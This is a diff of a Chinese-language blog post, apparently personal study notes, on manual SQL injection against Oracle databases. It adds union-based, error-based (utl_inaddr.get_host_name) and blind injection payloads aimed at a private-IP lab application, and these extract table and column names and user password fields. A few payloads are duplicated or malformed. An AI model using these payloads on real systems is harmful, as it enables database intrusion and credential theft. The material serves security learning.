@@ -8,15 +8,15 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>Oracle的手工注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Oracle的基本知识内置函数">
+  <meta name="description" content="Oracle获取数据的基本技巧（1）特殊表  dual表：是一个虚拟的表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。 user_tables表，该表的table_name列存放着当前数据库的所有表名。 user_tab_columns表，该表的column_name 存放着表的所有列名。  （2）Oracle查询需要带上表名，如select * from xxx">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Oracle的手工注入">
 <meta property="og:url" content="http://example.com/2021/04/29/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/Oracle%E7%9A%84%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Oracle的基本知识内置函数">
+<meta property="og:description" content="Oracle获取数据的基本技巧（1）特殊表  dual表：是一个虚拟的表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。 user_tables表，该表的table_name列存放着当前数据库的所有表名。 user_tab_columns表，该表的column_name 存放着表的所有列名。  （2）Oracle查询需要带上表名，如select * from xxx">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-04-29T07:24:31.000Z">
-<meta property="article:modified_time" content="2021-04-29T07:31:50.707Z">
+<meta property="article:modified_time" content="2021-05-09T11:57:58.237Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="安全进阶">
 <meta name="twitter:card" content="summary">
@@ -175,7 +175,140 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Oracle的基本知识"><a href="#Oracle的基本知识" class="headerlink" title="Oracle的基本知识"></a>Oracle的基本知识</h2><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3>
+        <h2 id="Oracle获取数据的基本技巧"><a href="#Oracle获取数据的基本技巧" class="headerlink" title="Oracle获取数据的基本技巧"></a>Oracle获取数据的基本技巧</h2><p>（1）特殊表</p>
+<ul>
+<li>dual表：是一个虚拟的表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。</li>
+<li>user_tables表，该表的table_name列存放着当前数据库的所有表名。</li>
+<li>user_tab_columns表，该表的column_name 存放着表的所有列名。</li>
+</ul>
+<p>（2）Oracle查询需要带上表名，如select * from xxx (有一个万能的表：dual表)</p>
+<p>（3）单行子查询返回多行需使用 where rownum=1来规范</p>
+<ul>
+<li>rownum 是伪序列数，总是从1开始</li>
+<li>oracle数据库从数据文件或缓冲区中读取数据的顺序。</li>
+<li>它取得第一条记录则rownum值为1，第二条为2，依次类推。</li>
+</ul>
+<h2 id="Oracle的基本知识"><a href="#Oracle的基本知识" class="headerlink" title="Oracle的基本知识"></a>Oracle的基本知识</h2><h3 id="内置语句"><a href="#内置语句" class="headerlink" title="内置语句"></a>内置语句</h3><p>（1）获取数据类</p>
+<ul>
+<li>获取数据库版本</li>
+</ul>
+<pre><code class="sql">* SQL&gt; select banner from sys.v_$version where rownum=1;
+
+BANNER
+--------------------------------------------------------------------------------
+
+Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</code></pre>
+<ul>
+<li>获取当前会话的登录名</li>
+</ul>
+<pre><code>SQL&gt; select user from dual;
+
+USER
+------------------------------
+SYSTEM</code></pre>
+<ul>
+<li>获取所有用户名</li>
+</ul>
+<pre><code>* SQL&gt; select username from dba_users;
+
+USERNAME
+------------------------------
+SYS
+SYSTEM
+SYSMAN
+SCOTT
+...</code></pre>
+<h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>（1）lenth()用法：lenth(char)  ：返回字符串的长度</p>
+<p>（2）COUNT(<em>)用法：COUNT(\</em>) 函数，返回在给定的选择中被选的行数</p>
+<p>（3）ascii()用法： ascii(char) 表示将字符转换为ASCII码</p>
+<p>（4）SUBSTR用法：SUBSTR( 源字符串, 查找起始位置, [ 长度 ] )返回值为源字符串中指定起始位置和长度的字符串。</p>
+<p>（5）INSTR用法：INSTR(源字符串, 要查找的字符串, 从第几个字符开始, 要找到第几个匹配的序号)返回找到的位置，如果找不到则返回0. 默认查找顺序为从左到右。当起始位置为负数的时候，从右边开始查找。若起始位置为0，返回值为0。</p>
+<h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><p>使用 || 来进行字符串的拼接</p>
+<pre><code>SQL&gt; select &#39;a&#39;||&#39;d&#39;||&#39;m&#39;||&#39;i&#39;||&#39;n&#39; from dual;
+
+&#39;A&#39;||
+-----
+admin
+SQL&gt; select chr(97)||chr(100)||chr(109)||chr(105)||chr(110) from dual;
+
+CHR(9
+-----
+admin</code></pre>
+<h3 id="在单行中输出多行信息"><a href="#在单行中输出多行信息" class="headerlink" title="在单行中输出多行信息"></a>在单行中输出多行信息</h3><p>使用sys.stragg()函数(11g+)来在单行中获取所有行信息</p>
+<pre><code class="sql">SQL&gt; select username from all_users;
+
+USERNAME
+------------------------------
+
+SQLINJECTION
+BI
+PM
+SCOTT
+…… （结果多行）
+SQL&gt; select sys.stragg(distinct username||&#39;;&#39;) from all_users; （多行结果以一行显示，并用‘;’隔开）
+
+SYS.STRAGG(DISTINCTUSERNAME||&#39;;&#39;)
+--------------------------------------------------------------------------------
+
+ANONYMOUS;APEX_030200;APEX_PUBLIC_USER;APPQOSSYS;BI;CTXSYS;DBSNMP;DIP;EXFSYS;FLO
+WS_FILES;HR;IX;MDDATA;MDSYS;MGMT_VIEW;OE;OLAPSYS;ORACLE_OCM;ORDDATA;ORDPLUGINS;O
+RDSYS;OUTLN;OWBSYS;OWBSYS_AUDIT;PM;SCOTT;SH;SI_INFORMTN_SCHEMA;SPATIAL_CSW_ADMIN
+_USR;SPATIAL_WFS_ADMIN_USR;SQLINJECTION;SYS;SYSMAN;SYSTEM;WMSYS;XDB;XS$NULL;</code></pre>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>（1）判断数据库列数：</p>
+<pre><code>order by N</code></pre>
+<p>（2）判断数据回显位置</p>
+<pre><code>union select null,null,null,null,...N from dual</code></pre>
+<p>（3）获取任意1行数据</p>
+<pre><code>rownum=1
+逐行排除</code></pre>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>（1）使用条件：HTTP返回包中含有原始数据库的报错信息。</p>
+<p>（2）Oracle报错注入——类型转换错误和报错函数。</p>
+<p>（3）1=utl_inaddr.get_host_name((SQL语句))</p>
+<p>（4）查询结果： ORA-29257: 未知的主机 结果</p>
+<p>（5）获取表名信息：</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select 
+table_name from user_tables where rownum=1)) --</code></pre>
+<p>（6）开始用不等于&lt;&gt;来枚举数据，获取除T_USER表外更多的获取关键表名信息，当显示无效数字，说明除已经枚举完所有的表。</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name(
+table_name&lt;&gt;&#39;T_USER&#39;)) --</code></pre>
+<p>（7）获取表T_USER中的列，先获取伪列为1的字段名。</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1)) --</code></pre>
+<p>（8）枚举表T_USER中的列，获取除列‘SUSER’外伪列为1的字段名。</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 and column_name &lt;&gt; &#39;SUSER&#39;)) --</code></pre>
+<p>（9）枚举表T_USER中的列，获取除列‘SUSER’、’SPWD’外伪列为1的字段名。</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 and column_name &lt;&gt; &#39;SUSER&#39; and column_name &lt;&gt;&#39;SPWD&#39;)) --</code></pre>
+<p>（10）枚举表T_USER中的列，获取除列‘SUSER’、’SPWD’、’SNAME’外伪列为1的字段名。</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 and column_name &lt;&gt; &#39;SUSER&#39; and column_name &lt;&gt;&#39;SPWD&#39;)) --</code></pre>
+<p>（11）获取列‘SUSER’、’SPWD’、’SNAME’的值</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select 
+sys.stragg(SUSER)||sys.stragg(SPWD)||sys.stragg(SNAME) from T_USER))-- </code></pre>
+<p>URL编码：</p>
+<pre><code class="sql">http://192.168.159.167:8080/SqlInjection/selcet?sname=1&#39; and 1=utl_inaddr.get_host_name((select 
+sys.stragg(SUSER)%7C%7Csys.stragg(SPWD)%7C%7Csys.stragg(SNAME) from T_USER))-- </code></pre>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>（1）使用条件：HTTP返回包中没有执行结果的数据和报错信息。</p>
+<p>（2）Oracle盲注核心——字符串截取函数、ascii转换函数、条件判断语句。</p>
+<pre><code class="sql">selcet?sname=1&#39; and (select ascii(substr(table_name,1,1)) from user_tables where rownum=1)=84—
+selcet?sname=1&#39; and (select ascii(substr(table_name,2,1)) from user_tables where rownum=1)=95-- 
+selcet?sname=1&#39; and (select ascii(substr(table_name,3,1)) from user_tables where rownum=1)=85-- 
+selcet?sname=1&#39; and (select ascii(substr(table_name,4,1)) from user_tables where rownum=1)=83-- 
+selcet?sname=1&#39; and (select ascii(substr(table_name,5,1)) from user_tables where rownum=1)=69-- 
+selcet?sname=1&#39; and (select ascii(substr(table_name,6,1)) from user_tables where rownum=1)=82-- </code></pre>
+<p>（3）使用Burp 实现半自动化盲注</p>
+<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>oracle 查询需要带上表名，dual万能表。</p>
+<pre><code class="sql">select 1,2,3 from dual       </code></pre>
+<p>查询当前数据库的所有表名</p>
+<pre><code class="sql">select table_name from user_tables</code></pre>
+<p>查询表名为xxx的所有字段名</p>
+<pre><code class="sql">select column_name from user_tab_columns where table_name=&#39;xxx&#39;</code></pre>
+<p>联合查询：</p>
+<pre><code class="sql">-1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3&#39; from dual --  
+
+-1&#39; union select table_name,&#39;2&#39;,&#39;3&#39; from user_tables where rownum=1 --  //查询到一张表T_USER
+
+-1&#39; union select column_name,&#39;2&#39;,&#39;3&#39; from user_tab_columns where table_name=&#39;T_USER&#39; and rownum=1 --  //查询到一个字段SUSER
+
+-1&#39; union select SUSER,&#39;2&#39;,&#39;3&#39; from T_USER where rownum=1 --  </code></pre>
+
       
 
       
@@ -279,6 +412,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          文件包含漏洞的原理与实践
+        
+      </div>
+    </a>
+  
   
     <a href="/2021/04/27/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/XSS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">XSS注入原理与实践进阶</div>
@@ -308,7 +450,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">Oracle的基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">内置函数</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%8A%80%E5%B7%A7"><span class="toc-number">1.</span> <span class="toc-text">Oracle获取数据的基本技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">Oracle的基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E8%AF%AD%E5%8F%A5"><span class="toc-number">2.1.</span> <span class="toc-text">内置语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%8D%95%E8%A1%8C%E4%B8%AD%E8%BE%93%E5%87%BA%E5%A4%9A%E8%A1%8C%E4%BF%A1%E6%81%AF"><span class="toc-number">2.4.</span> <span class="toc-text">在单行中输出多行信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.</span> <span class="toc-text">联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">6.</span> <span class="toc-text">扩展</span></a></li></ol>
                     </div>
                 </span>
             </div>
